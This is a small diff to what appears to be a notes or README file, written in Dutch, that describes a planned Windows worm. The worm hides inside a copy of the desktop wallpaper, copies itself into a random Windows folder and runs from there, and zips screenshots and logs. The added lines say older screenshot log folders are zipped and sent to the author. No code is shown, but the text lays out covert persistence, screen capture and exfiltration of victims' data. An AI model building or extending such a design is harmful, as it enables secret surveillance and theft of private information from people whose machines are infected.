@@ -3,3 +3,5 @@ Kopieer de windows achtergrond foto. implementeer de worm in de nieuwe foto. ver
 Het script kopieert zichzelf in random windows folder en runt die dan
 
 zips the images+log
+==>
+Wanneer er meer dan 1 screenshot log folder is wordt de vorige automatisch gezipt en naam mij doorgestuurd
